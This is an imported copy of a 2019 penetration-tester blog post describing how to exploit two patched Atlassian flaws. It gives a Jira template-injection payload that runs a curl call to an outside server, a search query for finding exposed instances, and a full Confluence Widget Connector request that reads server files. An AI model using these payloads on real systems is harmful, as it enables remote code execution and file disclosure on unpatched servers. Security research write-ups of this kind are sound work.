---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-09_two-easy-rce-in-atlassian-products.md
original_filename: 2019-08-09_two-easy-rce-in-atlassian-products.md
title: Two Easy RCE in Atlassian Products
category: documents
detected_topics:
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- otp
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: fd439dfefd5af6f246dbbe8218c4d4c78cfa9bb536b3cc2087a0386a17eca8a7
text_sha256: 5e35221d9be9ddb9428d51f139e09df0af4f444da4f029bc08b99829ce37bdd6
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: true
---

# Two Easy RCE in Atlassian Products

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-09_two-easy-rce-in-atlassian-products.md
- Source Type: markdown
- Detected Topics: command-injection, otp, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: True
- Raw SHA256: `fd439dfefd5af6f246dbbe8218c4d4c78cfa9bb536b3cc2087a0386a17eca8a7`
- Text SHA256: `5e35221d9be9ddb9428d51f139e09df0af4f444da4f029bc08b99829ce37bdd6`


## Content

---
title: "Two Easy RCE in Atlassian Products"
url: "https://medium.com/@valeriyshevchenko/two-easy-rce-in-atlassian-products-e8480eacdc7f"
authors: ["Valeriy Shevchenko (@Krevetk0Valeriy)"]
programs: ["Atlassian"]
bugs: ["Credential stuffing"]
publication_date: "2019-08-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5089
scraped_via: "browseros"
---

# Two Easy RCE in Atlassian Products

Two Easy RCE in Atlassian Products
Valeriy Shevchenko
Follow
4 min read
·
Aug 9, 2019

334

2

It was a long time from my last article. It was so many interesting results in my work. Seems that it's right time to share my knowledge and experience with you. But first, I wanna inform that two issues in that article well known. And both of that have CVE numbers with patches and software updates. So maybe you will be lucky to find old versions in your testing scope.

And I don't want to make hype on that article as 
Avinash Jain
 with old Jira vulnerability in Shared filters. From my perspective, it's a shame to make such hype around a bug with a questionable impact which was known for a long time ago.

Press enter or click to view image in full size
1. Jira Remote Code Execution in Contact Administrators form (CVE-2019–11581)

When it was discovered, I found first that video from 
Knownsec 404 team

But from that time it was no POC for exploitation.

But next, I found nice research from 
ruvlol
 where he discovered pretty well that the root of the problem in ContactAdministrators!default.jspa form. Also from his article, it was simple to understand that 
Knownsec 404 team
 was mistaken in numbers of affected instances. To find all public instances with such functionality you just need to search for :

inurl:secure/ContactAdministrators!default.jspa

So the exploitation process is very simple.

Check from the dashboard page that your Jira instance supports Contact Administrator form.
Press enter or click to view image in full size

2. Next, it's better to check the accessibility of that page from URL like:

https://jira.example.com/secure/ContactAdministrators!default.jspa

3. Prepare your BurpCollaborator or your server for getting request as POC. I used ngrok tunnel. And fill in the contact form with that payload.

$i18n.getClass().forName(‘java.lang.Runtime’).getMethod(‘getRuntime’,null).invoke(null,null).exec(‘curl http://your-testing-server.com/rcetest?a=a').waitFor()

That payload making just simple curl request to your server.

Press enter or click to view image in full size

4. Confirm your results with getting a request from Vulnerable Jira environment.

Press enter or click to view image in full size

For this issue to be exploitable at least one of the following conditions must be met:

an SMTP server has been configured in Jira and the Contact Administrators Form is enabled; or
an SMTP server has been configured in Jira and an attacker has “JIRA Administrators” access.

So now you know how to make such easy RCE attack in vulnerable Jira environment if your version is still vulnerable. You can check affected versions here.

2. Confluence Remote Code Execution via Widget Connector macro (CVE-2019–3396)

That fresh vulnerability came to me with one target where I did a security assessment. And it was some signs that my testing target could be vulnerable due RCE via Widget Connector. With such type of vulnerabilities, it's hard to make good POC. Because of the complexity of that issue. I spent a few time to understand the root of the problem from 
Knownsec 404 team
 in their article. And I can say that it's so exciting to understand such research articles and see some results on your environment.

Get Valeriy Shevchenko’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So I reproduced all steps on company Confluence. It was a valid issue and the entire server was shut down as vulnerable for mitigation work.

Here is my POC:

So first it’s an issue with Widget Connector. Which can lead to RCE on the server. Better to check first is your version still vulnerable due to that issue. If yes. Go next.

Just find a Youtube video to insert, click Preview, use Burpsuite to capture the package.

Press enter or click to view image in full size

2. Try to make such POST request with malicious payload in _template parameter. Also if you don’t have access to your confluence — just try to craft your request from my mock in that article. And don't forget to renew Cookie header.

POST /rest/tinymce/1/macro/preview HTTP/1.1
Referer: https://confluence.yourtarget.com/
Content-Type: application/json; charset=utf-8
Cookie: BIGipServerrb-p_cp-confluence_https_pool=!BUsntvn1os/4xuQWbHAsuN+1fsz22TIKPNFouw==;JSESSIONID=***REDACTED-SUSPECT-TOKEN***Accept: */*
Accept-Encoding: gzip,deflate
Content-Length: 173
Host: confluence.yourtarget.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive

{"contentId":"123","macro":{"name":"widget","body":"","params":{"url":"https://www.youtube.com/watch?v=1","width":"200","height":"200","_template":"/WEB-INF/web.xml"}}}

As you see I was requested for /WEB-INF/web.xml. When I was confirmed with the Windows environment on the other side. I was requested for file:///C:/Windows/ directory. And in an embedded object, I found a list of all data inside from the server.

Press enter or click to view image in full size

And the final step will be to execute the command. But at this point, it was enough to show valid POC for the company where I did a security assessment.

As you see both Atlassian RCE is pretty simple to exploit. And all you need now is to have the "right" vulnerable version of the Atlassian products ;)

PS: Click 👏 “Clapping Hands” icon if you like this article 😉

If you need to auditing, collaboration and testing some projects, please get in touch with me: http://t.me/valyaroller. I like to be helpful and have valuable findings.
